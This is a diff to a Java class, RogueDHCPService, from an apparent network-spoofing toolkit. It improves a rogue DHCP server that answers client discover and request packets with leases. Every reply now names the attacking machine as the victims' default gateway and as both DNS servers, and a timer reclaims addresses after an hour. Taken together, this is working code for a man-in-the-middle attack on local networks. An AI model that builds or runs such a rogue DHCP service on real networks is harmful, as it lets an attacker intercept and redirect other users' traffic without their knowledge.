@@ -2,13 +2,15 @@ package org.bitducks.spoofing.services;
 
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.util.Collection;
 import java.util.Collections;
+import java.util.HashSet;
 import java.util.Iterator;
 import java.util.LinkedList;
 import java.util.List;
+import java.util.Set;
+import java.util.Timer;
 
-import jpcap.JpcapCaptor;
-import jpcap.JpcapSender;
 import jpcap.NetworkInterface;
 import jpcap.NetworkInterfaceAddress;
 import jpcap.packet.EthernetPacket;
@@ -20,9 +22,7 @@ import org.bitducks.spoofing.core.Policy;
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
 import org.bitducks.spoofing.core.rules.DHCPRule;
-import org.bitducks.spoofing.packet.PacketFactory;
 import org.bitducks.spoofing.scan.IpRange;
-import org.bitducks.spoofing.scan.IpRangeIterator;
 import org.bitducks.spoofing.util.Constants;
 import org.bitducks.spoofing.util.IpUtil;
 import org.dhcp4java.DHCPConstants;
@@ -54,7 +54,9 @@ public class RogueDHCPService extends Service {
 	/**
 	 * The given adresses
 	 */
-	private List<InetAddress> givenAdresses = Collections.synchronizedList(new LinkedList<InetAddress>());
+	private Set<InetAddress> givenAdresses = Collections.synchronizedSet(new HashSet<InetAddress>());
+	
+	private Timer timer = new Timer();
 
 	public RogueDHCPService() {
 		Policy policy = this.getPolicy();
@@ -67,16 +69,18 @@ public class RogueDHCPService extends Service {
 		this.server = deviceAddress.address;
 		this.range = new IpRange(
 				IpUtil.network(deviceAddress), 
-				IpUtil.lastIpInNetwork(deviceAddress))
+				IpUtil.lastIpInNetwork2(deviceAddress))
 		.iterator();
 		this.range.next();
 	}
 
 	@Override
 	public void run() {
+		this.timer.schedule(new HostDown(this, this.givenAdresses), 60 * 60 * 1000); //For 1 hour
+		
 		while(!this.isCloseRequested()) {
 			Packet p = this.getNextPacket();
-			System.out.println(p);
+			//System.out.println(p);
 			if(p != null) {
 				try {
 					DHCPPacket dhcp = DHCPPacket.getPacket(p.data, 0, p.data.length, false);
@@ -84,23 +88,23 @@ public class RogueDHCPService extends Service {
 					
 					switch(option) {
 					case DHCPConstants.DHCPDISCOVER:
-						System.out.println("Discover");
 						this.makeOffer(dhcp);
 						break;
 					case DHCPConstants.DHCPREQUEST:
-						System.out.println("Request");
 						this.makeAck(dhcp);
 						break;
 					}
 				} catch(Exception e) /* We catch all exception if the packet is bad */{ e.printStackTrace(); }
 			}
 		}
+		
+		this.timer.cancel();
 	}
 
 	public void makeOffer(DHCPPacket dhcp) throws UnknownHostException {
 		InetAddress offer = this.getAddressOffer();
 		this.givenAdresses.add(offer);
-		DHCPPacket dhcpOffer = DHCPResponseFactory.makeDHCPOffer(dhcp, this.getAddressOffer(), 0xffffffff, this.server, "", null);
+		DHCPPacket dhcpOffer = DHCPResponseFactory.makeDHCPOffer(dhcp, offer, 0xffffffff, this.server, "", null);
 		
 		this.sendDHCPPacket(dhcpOffer);
 	}
@@ -113,6 +117,18 @@ public class RogueDHCPService extends Service {
 	}
 	
 	private void sendDHCPPacket(DHCPPacket dhcp) throws UnknownHostException {
+		// Subnet mask address
+		dhcp.setOptionRaw((byte) 1, this.device.addresses[0].subnet.getAddress());
+		
+		// Broadcast IP Address 
+		dhcp.setOptionRaw((byte) 28, this.device.addresses[0].broadcast.getAddress());
+		
+		// Gateway
+		dhcp.setOptionAsInetAddress((byte) 3, this.server);
+		
+		//DNS Server
+		dhcp.setOptionAsInetAddresses((byte) 6, new InetAddress[] {this.server, this.server});
+		
 		EthernetPacket ether = new EthernetPacket();
 		ether.frametype = EthernetPacket.ETHERTYPE_IP;
 		ether.src_mac = this.device.mac_address;
@@ -146,7 +162,9 @@ public class RogueDHCPService extends Service {
 		}
 	}
 	
-	public void addFreeAddress(InetAddress address) {
-		this.freeAddress.add(address);
+	public void addFreeAddress(Collection<InetAddress> address) {
+		this.freeAddress.addAll(address);
+		this.givenAdresses.removeAll(address);
+		this.timer.schedule(new HostDown(this, this.givenAdresses), 60 * 60 * 1000); //For 1 hour
 	}
 }
